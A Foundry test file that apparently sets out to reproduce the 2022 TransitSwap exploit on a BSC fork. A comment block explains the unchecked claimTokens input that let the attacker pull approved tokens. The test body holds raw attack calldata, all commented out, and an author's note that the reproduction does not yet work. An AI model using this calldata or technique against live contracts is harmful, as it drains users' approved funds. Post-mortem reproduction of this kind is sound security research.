// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";

// forge test --match-contract Exploit_TransitSwap -vvv

/*
On Oct 2, 2022 an attacker stole nearly $400,000 in BSC-USD tokens from BSC and $742,000 in USDC from the TransitSwap only in the shown transactions.
The total value lost ascends to ~$23MM. 

A considerable amount of assets was recovered: https://www.coindesk.com/business/2022/10/03/transit-swap-exploiter-returns-large-chunk-of-289m-hack/

// Attack Overview
Total Lost:  ~400,000 BSC-USD ($400,000) + ~742,000 USDC ($742,000)
Attack Tx: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189
Attack Tx: https://etherscan.io/tx/0x743e4ee2c478300ac768fdba415eb4a23ae66981c076f9bff946c0bf530be0c7

Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x743e4ee2c478300ac768fdba415eb4a23ae66981c076f9bff946c0bf530be0c7
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189

Exploited Contract: 
Attacker Address: 0x75F2abA6a44580D7be2C4e42885D4a1917bFFD46
Attack Block: 14037237

// Key Info Sources
Cointelegraph: https://cointelegraph.com/news/main-hacker-in-transit-swap-exploit-agrees-to-return-remaining-funds
Writeup: https://slowmist.medium.com/cross-chain-dex-aggregator-transit-swap-hacked-analysis-74ba39c22020

ATTACK:
Principle: Poor input validation

The transit swap is a non verified contract....
Essentially, the attacker:
1) Scanned USDC and BSC-USD tokens approvals to the DEX Manager
2) Found a vulnerable claimTokens() function which invokes ‘transferFrom’ of the specified token contract. 
3) The claimTokens function should target the bridge as the destination of the funds which input was not checked.
4) Because users allowed the DEX to manage their funds, the attacker could pass the address of his contract as if it was the bridge.


MITIGATIONS:
1) While performing transferFrom, check if the destination/origin of the funds should be restricted
2) Do not enforce users Approving For All, instead request them only to approve for a specific amount of tokens (when applies).

*/

contract Exploit_TransitSwap is TestHarness {

    IERC20 internal constant bscpegged = IERC20(0x55d398326f99059fF775485246999027B3197955);

    bytes32 internal constant EXPLOIT_TX = 0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189;
    address internal constant ATTACKER = 0x75F2abA6a44580D7be2C4e42885D4a1917bFFD46;
    address TransitSwap = 0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;

    function setUp() external {
        cheat.createSelectFork("bsc", 21816545); // We pin one block before the exploit happened

        cheat.label(ATTACKER, "Attacker");
    }

    // None of the alternatives performed the hack. Need to dig deeper.
    function test_attack_reproduced() external {
        console.log("Attacker balance before:", bscpegged.balanceOf(ATTACKER));
        // bytes memory payload = hex"2d430ffc00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000640000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000403c6f4f02f8439d6a0ac9094a560d192b12e04700000000000000000000000004b26af2c14881da078771f836721cfb3bee65da00000000000000000000000030d654afb4d643ebb9835ddf36871453f93352f300000000000000000000000030d654afb4d643ebb9835ddf36871453f93352f3000000000000000000000000f6dc004091c66f22b88aa0c9a1ba56023380ae900000000000000000000000006038b3d0f230075d27c8b9341f7ab9e51c95aa2e0000000000000000000000008392a593ae81c6f2979d6fa836075cdd1eba3d3d00000000000000000000000042309c52fb09bf100bf0aeed573589a84c35e41600000000000000000000000042309c52fb09bf100bf0aeed573589a84c35e416000000000000000000000000ed638bb1268bc1e98da6c1ab47e730bfffa15d2e0000000000000000000000002b3014688e9b8021ac1f8e8f83d84883b37f436c000000000000000000000000d6056bca56854aecd72c181998dfa089e14c4752000000000000000000000000d6056bca56854aecd72c181998dfa089e14c475200000000000000000000000049be5a08addff3038a95facfe60a1dfb491c93af000000000000000000000000794074cb4f28fb96c182b8363dd64797e5ae6d330000000000000000000000000cc4c375a799f7a92af1a6a334a1e4bf07ad289f0000000000000000000000000cc4c375a799f7a92af1a6a334a1e4bf07ad289f000000000000000000000000f56eca3c6ea4ad1c7c76ed0894a8926746dd43e6000000000000000000000000f56eca3c6ea4ad1c7c76ed0894a8926746dd43e6000000000000000000000000d2387a6283beef064c9e04efde383edd8d9b0e0b000000000000000000000000e070ec0c592cf8fbe347a4185f2561d54304a799000000000000000000000000e070ec0c592cf8fbe347a4185f2561d54304a79900000000000000000000000051b75e9388f778478e45fa84d3d8d0249202a77c00000000000000000000000005ead0451838392de23b43d1516ef65f5b44fdc400000000000000000000000005ead0451838392de23b43d1516ef65f5b44fdc4000000000000000000000000505db7ee7a8cac9f6f761818041955a9e990e970000000000000000000000000a7ecf2d9009a66bbffd4a8e43f69fe2ce10e329f0000000000000000000000007f77a02e2a1bfe784ae6bbf739fcb7cbad67c2090000000000000000000000007f77a02e2a1bfe784ae6bbf739fcb7cbad67c20900000000000000000000000026c8d3565fec07c9535122eb7f07451cfd6d43f600000000000000000000000031b69e2fd3b4b8e53b1c8cb0dbe5d037872911090000000000000000000000000fce11d3117683da77a1dc3151fba83b1cc2f0ee00000000000000000000000011d36f0f875f6824341417b2f956e0cc40720dbb00000000000000000000000018b071a944d02ae1834c4d5a96558901b50c91b9000000000000000000000000af90f384d344519cbc6e342915caafdcd5fb3ae6000000000000000000000000c40ab5af2f6610bc04c34d2ca47b1958fc43c3990000000000000000000000001671da189e090bd24f9acc30b0763377fe5b6afd000000000000000000000000b3bbf6ca56f8351ac93d927908d2b597760f12e9000000000000000000000000f7c714866281be67b703f7eab7f5862910a818a8000000000000000000000000d302597c2f363d3b4b07516bef6e171c65c84ad80000000000000000000000009755ce3324989138303157eb40b5afbf515ef96f0000000000000000000000003c74f7d1e7ac6655defcf85307c75b91936422380000000000000000000000008953e91a356a8bec59ad44fe80957ba7caa077ee0000000000000000000000008953e91a356a8bec59ad44fe80957ba7caa077ee0000000000000000000000003cdd9e68f5bcccc9264ffc28212785ce0d06443f0000000000000000000000002e8f4733c6f3b62a780bce5aa4141242c4dc03d20000000000000000000000008a51c4b4ce69093eef0be69f7d392df691add2c200000000000000000000000040d59d6c69efb305aa9c3d429bf956be86e9af0400000000000000000000000040d59d6c69efb305aa9c3d429bf956be86e9af040000000000000000000000009edee434e656a542cd33e79053337de46fe0af4c000000000000000000000000bfcfee35140cb0d330070295dfc22c0ddc395a7f00000000000000000000000053f37c9c174de589aa14035ee79749e18377153a00000000000000000000000003bdefb5a75a98d8c618ab54f3a37ef25b3277ec000000000000000000000000dbf11a86feaa34068d52c4cf788472ad10a63b7b000000000000000000000000dbf11a86feaa34068d52c4cf788472ad10a63b7b0000000000000000000000000d5a730fa9e27f3f6e1eb5a59472750fcc168ced000000000000000000000000e07bc74a92ccd844349207ba697e5094a1116eb50000000000000000000000005dd4fa8f0d934f779920c92e180be77c081636880000000000000000000000004130f00042d575238acdc60804b6d1249230aa60000000000000000000000000deadb1bc073d7a0e26236fc359fa00bb4362732a000000000000000000000000ad820a90ca09933948b6c8d7494690b5ba280838000000000000000000000000bb2f3c01525f811ada6c8041d49c2b7a953e3ea30000000000000000000000005e89d4e09018390e4c541be45df4f9148fa7d7230000000000000000000000005e89d4e09018390e4c541be45df4f9148fa7d723000000000000000000000000451fc2674ce1805cc47a4ca3015d14cea7df054d000000000000000000000000c727146809c71dde34705bfb3d89bf5b0fa5ec18000000000000000000000000bfcdba43d3149d338750c76e12467aac76236a57000000000000000000000000411d5b7765cd278c8f7b3a20c2d94ec9002ee36c000000000000000000000000a6ed8d60c009fb8fd0be45f0abb68edcdfacd244000000000000000000000000a6ed8d60c009fb8fd0be45f0abb68edcdfacd244000000000000000000000000a4a002c97ee7782a8147882e79fb7e3c8ece8f830000000000000000000000000a6e18a29300abe5a4047d09a2b6d7d98537b6d90000000000000000000000006c6a86c7ca09015fc4cc84e0b4f5de72969fec100000000000000000000000006c6a86c7ca09015fc4cc84e0b4f5de72969fec10000000000000000000000000ae7759be17efa311720ccdf7dad80b8160dfe8b3000000000000000000000000672d0df785a2cab576b54b1a0d7f1ddfee816ccc0000000000000000000000005413bde3523ed0b83e4bcd71d55b453fc780f7760000000000000000000000005413bde3523ed0b83e4bcd71d55b453fc780f7760000000000000000000000005413bde3523ed0b83e4bcd71d55b453fc780f77600000000000000000000000030e7c99f5fe70c3e4a9d1cfa0a37dbb5adf4a566000000000000000000000000104855ddcf24bdb002a4bcf47fc8e9cd514832b700000000000000000000000078dac04f37417a737908bc42539617f6d78cd14500000000000000000000000078dac04f37417a737908bc42539617f6d78cd1450000000000000000000000005fd2d2b6815b52fda63f79da46050f4329a984ba00000000000000000000000003c5c9265889066dcfda169d32c86f2fb5d00bd5000000000000000000000000cd0370c7fe761a873ae594082d3bcdacd1091c39000000000000000000000000a57dfa8696f82b27a461abc716c3dafc9cf425b200000000000000000000000086638ebfe148e2a3e3192bec325b01fa24fe41040000000000000000000000005640abc39e205b15ce3dae1b79ca43afe75f9a4600000000000000000000000088c4202c11fd3a13862b8f25d3cf09dad66c1f5f0000000000000000000000008e2d277d5d996ac6e0798a504326d74a2cf3a5c50000000000000000000000008e2d277d5d996ac6e0798a504326d74a2cf3a5c500000000000000000000000011066e9211888ba435365e7a1cd9946441b3992e000000000000000000000000a6411bd4e8729da2f7dc80171304e6fa36f22a180000000000000000000000006522424d6991a0269c1df778b9dadc22abf70126000000000000000000000000e7725f2cc700e97a6fe30f13932741249b191e800000000000000000000000009f0cd6d70f51d38bed599cd856a7fab67149bf5a0000000000000000000000009f0cd6d70f51d38bed599cd856a7fab67149bf5a000000000000000000000000ec724efadf0565862420764fe046187776da5f3e";
        // cheat.prank(ATTACKER);
        // TransitSwap.call(hex"006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e8400000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000");
        // cheat.transact(EXPLOIT_TX);
        // address(0).call(payload);
        console.log("Attacker balance after:", bscpegged.balanceOf(ATTACKER));
    }
}
